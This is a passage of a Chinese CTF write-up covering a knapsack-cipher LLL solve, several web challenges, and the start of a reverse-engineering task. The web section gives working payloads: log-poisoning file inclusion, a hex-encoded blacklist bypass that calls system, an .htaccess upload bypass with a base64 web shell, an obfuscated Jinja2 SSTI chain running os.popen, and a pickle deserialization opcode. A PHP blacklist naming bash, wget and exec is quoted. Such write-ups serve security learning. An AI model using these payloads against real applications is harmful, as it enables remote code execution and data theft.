class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m,lenth</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">&#x27;0&#x27;</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plain,pk</span>):</span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><p>背包密码系统，LLL算法解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">pubKey = []</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line">encoded = </span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(M))</span><br><span class="line">        </span><br><span class="line"><span class="string">b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>文件包含，绕 <code>require_once</code>，burpsuite或 <code>curl -A</code> 修改User-Agent为 <code>&lt;?php show_source(&quot;flag.php&quot;);?&gt;</code>，</p><p>然后用日志包含 <code>?file=/var/log/nginx/access.log</code> 得到flag。</p><p>​    </p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><blockquote><p>Post something</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>异常处理函数 <code>use()</code> 中输出flag，传参时传入数组即可触发异常：<code>ctf[]=1</code>。</p><p>​    </p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>黑名单绕过rce，用16进制编码绕过：<code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;);</code></p><p>​    </p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>文件上传后缀白名单绕过，利用.htaccess文件实现非PHP文件解析成PHP代码执行。</p><p>先上传 <code>.htaccess</code> 文件，由于文件中不能包含 <code>&lt;?</code> ，用PHP伪协议base64解码处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>再上传base64编码后的 <code>shell.xxx</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7</span><br></pre></td></tr></table></figure><p>访问 <code>shell.xxx</code>，其中内容 <code>&lt;?php print_r(file_get_contents(&#39;/flag&#39;));</code> 以PHP代码执行，得到flag。</p><p>​    </p><h3 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h3><p>登录框随便输入账号密码，进入 <code>Hello xxx</code> 界面，尝试更换账号为 <code>&#123;&#123;2*3&#125;&#125;</code>，出现 <code>Hello 6</code>，可利用SSTI注入rce。</p><p>Fuzz发现过滤了很多符号，包括 <code>request _ &#39; &quot; [ . 空格 class getitem import</code> 等，不过 <code>config</code> 可用，可从 <code>&#123;&#123;config&#125;&#125;</code> 内容字符串中找到所需字符来拼接构造字符串，可以避免用到引号；过滤的关键词使用 <code>dict(cla=aa,ss=bb)|join()</code> 形式绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _</span></span><br><span class="line">config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 空格</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># /</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__</span></span><br><span class="line">(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.__class__.__init__.__globals__</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(geti=aa,tem=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)(<span class="built_in">dict</span>(o=aa,s=bb)|join())|attr(<span class="built_in">dict</span>(po=aa,pen=bb)|join())(<span class="built_in">dict</span>(c=aa,at=bb)|join()+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)+<span class="built_in">dict</span>(fl=aa,ag=bb)|join())|attr(<span class="built_in">dict</span>(re=aa,ad=bb)|join())()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flask框架，用到python反序列化，参考<a href="https://www.ieven762.cn/index.php/archives/109/">巅峰极客2021 - what_pickle</a>，限制了加载的模块只能为 <code>config</code> 里的，名字不能有 <code>__</code>，但是可以通过 <code>config</code> 的 <code>backdoor(cmd)</code> 函数绕过。</p><p>这题简化了 <code>backdoor(cmd)</code> 函数的使用条件，直接调用即可。利用pker构造opcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>base64编码opcode，传参：</p><p><code>data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3><blockquote><p>简单的加密</p></blockquote><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-160h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">247</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i + <span class="number">36</span>] = v5[i];</span><br><span class="line">    v4[i] = v6 ^ (v4[i + <span class="number">36</span>] + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x23</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != result_0[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j == <span class="number">35</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span 